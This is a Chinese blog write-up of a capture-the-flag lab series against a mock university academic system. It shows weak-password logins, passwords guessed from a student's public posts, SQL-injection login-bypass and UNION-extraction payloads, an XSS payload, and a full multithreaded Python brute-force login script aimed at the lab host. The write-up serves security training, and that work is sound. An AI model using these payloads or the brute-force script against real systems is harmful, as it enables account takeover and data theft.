---
title: 好靶场-EDU WP
date: 2026-08-07
categories: ["CTF-Writeups"]
permalink: /ctf-writeups/haobachang-edu-wp
recommend: 92
---

# 1. 一个普普通通的edu 1
靶场已启动就是一个# 好靶场网络安全大学
![](/images/20260726194719.webp)
二话不说，我们直接尝试登录一下教务系统
![](/images/20260726194806.webp)
给了个测试账号，登进去看看
![](/images/20260726194854.webp)
看到这里有修改头像，第一时间想到能不能利用文件上传来获取shell，不过尝试了半天，也没用，php代码无法执行，既然是教务系统，尝试能不能登录管理员的账号，于是开始尝试弱口令，admin/admin---居然成功了？原来就是一个弱口令啊
![](/images/20260726195655.webp)
就拿到flag啦！！！
# 2. 一个普普通通的edu 2
和第一题一样，第一题是弱口令，第二题总该是文件上传了吧？实则不然，也是一个弱口令？？？！！！这次不是admin/admin了，是system/123456
就能拿到flag
# 3. 一个普普通通的edu 3
**靶场描述：** 本关任务：你必须登录进xiaowang才能拿到Flag，xiaowang是一个喜欢逛贴吧的大一新生
![](/images/20260726234502.webp)
找到小王的贴吧
![](/images/20260726234550.webp)
猜测他的密码是20080214---不对；
xw20080214---不对；
xw0214---不对；
......密码是xiaowang20080214
![](/images/20260726234747.webp)
就拿到flag啦！！！（所以平时要注意保护自己的个人信息）
# 4. 一个普普通通的edu 4
**靶场描述：** 你必须登录进admin才能拿到Flag，注意这里不是爆破
和前面一样，是一个登录的界面，让我们登录admin账号，既然不是弱口令了，那我们就尝试一下sql注入，首先上来的肯定就是万能钥匙啦，`admin' or 1=1 #`
确实是登录进来了，但是好像不是admin账号，而是haobachang这个测试账号,
于是换一个payload尝试把密码注释掉，`admin' --`结果显示用户或密码错误，再换一个payload``admin' #``这次就成功登录了，就拿到flag啦！！！
# 5. 一个普普通通的edu 5
**靶场描述：** 你必须登录进admin才能拿到Flag，注意这里不是爆破
这里和edu 4不一样，试了很多次万能密码，都没有效果
```
admin' or 1=1 # 
admin' --
admin' # 
"OR"1"="1  # 虽然这个登录进去了，但是是haobachang这个测试账号
```
嘶，我明明登录的是admin啊，为什么会进入haobachang呢？于是看了一眼wp，`它应该有个账号绑定条件，默认读取的是首个账号的，那么换个万能密码方式："OR(username="admin")OR"强制绑定下admin账号，登录路成功拿到flag。`
还真没遇到过这样的情况，就拿到flag啦！！！
# 6. 一个普普通通的edu 6
本关提示：我是刘海月，我的身份证丢了   
本关任务：请登录刘海月的账号。
在好靶场贴吧找到了刘海月的信息
![](/images/20260727095402.webp)
登录提示：
1. 在校学生、教职工通过统一身份验证登录。
2. 用户名为教务系统中的工号、学号或用户名拼音，初始密码为身份证号后6位。
所以账号为liuhaiyue，密码为身份证号后6位677555
![](/images/20260727095449.webp)
就拿到flag啦！！！
# 7. 一个普普通通的edu 7
本关提示：我是王一二，希望能和你交一个朋友  
本关任务：请登录王一二的账号。小提示王一二的身份证后6位是00+数字
这个就很简单了，简单的四位数密码爆破，得到密码002219，爆破脚本：
```python
import requests, sys, time  
from concurrent.futures import ThreadPoolExecutor, as_completed  
  
URL = "http://hbc2.haobachang.com:13313/login"  
USER = "wangyier"  
THREADS = 30  
  
found = None  
tried = 0  
lock = __import__('threading').Lock()  
  
def login(pwd):  
    global found, tried  
    if found:  
        return None  
    try:  
        r = requests.post(URL, data={"username": USER, "password": pwd},  
                          timeout=30, allow_redirects=False)  
        with lock:  
            tried += 1  
        if r.status_code == 302:  
            found = (pwd, r.headers.get("Location", ""))  
            return (pwd, True, r.headers.get("Location", ""))  
        return (pwd, False, "")  
    except Exception as e:  
        return (pwd, False, str(e))  
  
print(f"[*] Target: {URL}")  
print(f"[*] Username: {USER}")  
print(f"[*] Range: 000000 ~ 009999")  
print(f"[*] Threads: {THREADS}")  
print("-" * 50)  
  
t0 = time.time()  
pwds = [f"00{i:04d}" for i in range(10000)]  
  
with ThreadPoolExecutor(max_workers=THREADS) as ex:  
    futs = {ex.submit(login, p): p for p in pwds}  
    for f in as_completed(futs):  
        res = f.result()  
        if res is None:  
            continue  
        pwd, ok, info = res  
        if tried % 200 == 0:  
            elapsed = time.time() - t0  
            sys.stdout.write(f"\r[{tried}/10000] {pwd}  {tried/elapsed:.1f}/s  ")  
            sys.stdout.flush()  
        if ok:  
            elapsed = time.time() - t0  
            print(f"\n\n{'='*50}")  
            print(f"  PASSWORD FOUND: {pwd}")  
            print(f"  Redirect: {info}")  
            print(f"  Time: {elapsed:.1f}s  |  Tries: {tried}")  
            print(f"{'='*50}")  
            ex.shutdown(wait=False, cancel_futures=True)  
            break  
    else:  
        print(f"\n[-] Not found ({tried} tried in {time.time()-t0:.1f}s)")  
  
print("\nDone.")
```
就拿到flag啦！！！
# 8. 一个简简单单的edu 8
本关提示：注意错误提示（起初看到提示没在意）
还是前面正常的操作，尝试了admin/admin123
![](/images/20260731194943.webp)
什么情况？于是抓了个包，神奇的是，看似发送一个请求实则发送了两个，还有一个`/check xss?msq=hello`的检测xss的数据包，于是就去看了看前端代码，分析后发现这个仅仅检测而不会拦截xss，如果检测到有xss就提示出来，如果false就没反应
![](/images/20260731195333.webp)
既然有检测是否有xss语句且不是拦截，那就直接输入xss payload试试水，随便尝试了`<img src=x onerror=alert(1)/>`，直接弹出了flag啦！！！
# 9. 一个简简单单的edu 9
本关提示：注意公告 
打开就是熟悉的好靶场网络安全大学首页
![](/images/20260731200100.webp)
看到首页的公告列表，随便点开一个公告看看，发现URL是 `/announcement?id=21`，典型的数字型参数，一看就有SQL注入。
![](/images/20260731200101.webp)
题目提示都给了`id=-1 UNION SELECT NULL,NULL,NULL,NULL,NULL--`，直接上，页面没有报错，说明确实是5列！标题和内容都变成了 None，确认了 UNION SELECT 注入成功。
![](/images/20260731200102.webp)
接下来就是常规的SQL注入流程了。先用 `@@version` 看看是什么数据库——MariaDB 10.11.11。
![](/images/20260731200103.webp)
查表：
```
id=-1 UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```
得到 courses,departments,announcements,classes,student_courses,users，flag大概率在announcements里。
![](/images/20260731200104.webp)
把announcements表里所有id和title列出来看看，末尾赫然出现了一个 `32:flag` ！！！
```
id=-1 UNION SELECT NULL,GROUP_CONCAT(id,':',title SEPARATOR ' | '),NULL,NULL,NULL FROM announcements--
```
![](/images/20260731200105.webp)
直接访问 `/announcement?id=32`，结果提示「公告不存在」，原来id=32是一个草稿状态，前端不会显示出来。
![](/images/20260731200106.webp)
那我们就用SQL注入直接读它的内容：
```
id=-1 UNION SELECT NULL,title,content,NULL,NULL FROM announcements WHERE id=32--
```
![](/images/20260731200107.webp)
就拿到flag啦！！！
